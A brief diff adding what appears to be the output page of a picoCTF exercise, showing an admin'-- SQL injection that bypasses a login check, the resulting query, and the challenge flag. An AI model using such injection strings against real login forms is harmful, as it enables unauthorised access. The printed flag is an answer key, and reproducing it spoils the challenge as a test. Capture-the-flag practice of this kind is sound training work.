@@ -1,0 +1,4 @@
+<pre>username: admin'--
+password: test
+SQL query: SELECT * FROM users WHERE name='admin'--' AND password='test'
+</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>
